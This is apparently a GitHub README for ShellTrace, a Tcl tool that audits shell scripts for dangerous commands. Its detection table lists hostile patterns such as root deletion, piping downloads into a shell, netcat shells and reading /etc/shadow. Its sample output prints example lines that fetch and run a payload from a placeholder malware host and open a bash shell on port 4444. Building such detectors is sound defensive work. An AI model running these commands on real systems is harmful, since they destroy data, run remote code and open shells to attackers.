# NullSec ShellTrace

**Shell Command Auditor** written in Tcl

[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)](https://github.com/bad-antics/nullsec-shelltrace/releases)
[![Language](https://img.shields.io/badge/language-Tcl-orange.svg)](https://www.tcl-lang.org/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

> Part of the **NullSec** offensive security toolkit  
> Discord: [discord.gg/killers](https://discord.gg/killers)  
> Portal: [bad-antics.github.io](https://bad-antics.github.io)

## Overview

ShellTrace is a shell script security auditor that identifies dangerous commands, potential backdoors, and security misconfigurations. Built with Tcl's powerful string manipulation and pattern matching capabilities, perfect for analyzing bash scripts, automation, and CI/CD pipelines.

## Tcl Features Showcased

- **String Manipulation**: Powerful text processing
- **Regular Expressions**: Flexible pattern matching
- **List Processing**: Dynamic data structures
- **Dictionaries**: Key-value data storage
- **Procedures**: Modular function definitions
- **File I/O**: Script file analysis
- **Command Substitution**: Dynamic evaluation

## Detected Patterns

| Pattern | Risk | MITRE ID | Description |
|---------|------|----------|-------------|
| `rm -rf /` | CRITICAL | T1485 | Root deletion |
| `dd of=/dev/` | CRITICAL | T1561 | Device overwrite |
| `wget \| bash` | CRITICAL | T1059 | Remote code exec |
| `curl \| sh` | CRITICAL | T1059 | Remote code exec |
| `nc -e` | CRITICAL | T1059 | Reverse shell |
| `base64 -d \| bash` | CRITICAL | T1027 | Encoded payload |
| `setenforce 0` | CRITICAL | T1562 | SELinux bypass |
| `chmod -R 777` | HIGH | T1222 | Insecure perms |
| `unset HISTFILE` | HIGH | T1070 | Anti-forensics |
| `iptables -F` | HIGH | T1562 | Firewall bypass |
| `alias ls=` | HIGH | T1574 | Command hijack |
| `sshpass` | HIGH | T1110 | Plaintext creds |
| `/etc/shadow` | HIGH | T1003 | Credential access |
| `history -c` | MEDIUM | T1070 | History clearing |
| `export PATH=` | MEDIUM | T1574 | PATH hijacking |
| `crontab -e` | MEDIUM | T1053 | Persistence |

## Installation

```bash
# Clone
git clone https://github.com/bad-antics/nullsec-shelltrace.git
cd nullsec-shelltrace

# Run (requires Tcl 8.6+)
tclsh shelltrace.tcl <script.sh>
```

## Usage

```bash
# Analyze a shell script
tclsh shelltrace.tcl /path/to/script.sh

# Run demo mode
tclsh shelltrace.tcl --demo

# Show help
tclsh shelltrace.tcl --help
```

### Options

```
USAGE:
    shelltrace [OPTIONS] <SCRIPT>

OPTIONS:
    -h, --help       Show help
    -o, --output     Output format (text/json)
    -s, --severity   Minimum severity to report
```

## Sample Output

```
╔══════════════════════════════════════════════════════════════════╗
║            NullSec ShellTrace - Shell Command Auditor            ║
╚══════════════════════════════════════════════════════════════════╝

[Demo Mode]

Analyzing suspicious shell script...

  [CRITICAL] wget pipe to shell
    Line:        5
    Command:     wget http://malware.com/payload.sh | bash
    MITRE:       T1059
    Description: Remote code execution

  [CRITICAL] rm -rf /
    Line:        7
    Command:     rm -rf /
    MITRE:       T1485
    Description: Recursive root deletion

  [CRITICAL] netcat listener exec
    Line:        15
    Command:     nc -l -p 4444 -e /bin/bash
    MITRE:       T1059
    Description: Reverse shell capability

  [HIGH] unset HISTFILE
    Line:        13
    Command:     unset HISTFILE
    MITRE:       T1070
    Description: History logging bypass

═══════════════════════════════════════════

  Summary:
    Issues Found: 12
    Critical:     5
    High:         4
    Medium:       3
    Low:          0
```

## Code Highlights

### Pattern Definition with Metadata
```tcl
set dangerous_patterns {
    {rm\s+-rf\s+/} {command "rm -rf /" risk critical mitre "T1485" desc "Recursive root deletion"}
    {wget\s+.*\|\s*(sh|bash)} {command "wget pipe to shell" risk critical mitre "T1059" desc "Remote code execution"}
    {nc\s+-l.*-e} {command "netcat listener exec" risk critical mitre "T1059" desc "Reverse shell capability"}
}
```

### Dictionary-Based Findings
```tcl
proc create_finding {line_num line pattern_data} {
    return [dict create \
        line_number $line_num \
        command $line \
        pattern_name [dict get $pattern_data command] \
        risk [dict get $pattern_data risk] \
        mitre [dict get $pattern_data mitre] \
        description [dict get $pattern_data desc]]
}
```

### Pattern Matching
```tcl
proc analyze_line {line line_num} {
    global dangerous_patterns
    set findings {}
    
    foreach {pattern metadata} $dangerous_patterns {
        if {[regexp -nocase $pattern $line]} {
            lappend findings [create_finding $line_num $line $metadata]
        }
    }
    
    return $findings
}
```

## Use Cases

| Scenario | Application |
|----------|-------------|
| CI/CD Review | Audit deployment scripts |
| Code Review | Check bash scripts for issues |
| Forensics | Analyze suspicious scripts |
| Compliance | Security policy enforcement |
| DevSecOps | Automated security scanning |

## Why Tcl?

| Requirement | Tcl Advantage |
|-------------|---------------|
| String Processing | Native strength |
| Regular Expressions | Built-in support |
| Scripting | Embeddable, lightweight |
| Cross-platform | Runs everywhere |
| Rapid Development | Simple syntax |
| Legacy Integration | 30+ years of libraries |

## License

MIT License - See [LICENSE](LICENSE) for details.

## Related Tools

- [nullsec-clusterguard](https://github.com/bad-antics/nullsec-clusterguard) - Distributed IDS (Erlang)
- [nullsec-reporaider](https://github.com/bad-antics/nullsec-reporaider) - Secret scanner (Clojure)
- [nullsec-tainttrack](https://github.com/bad-antics/nullsec-tainttrack) - Taint analysis (OCaml)
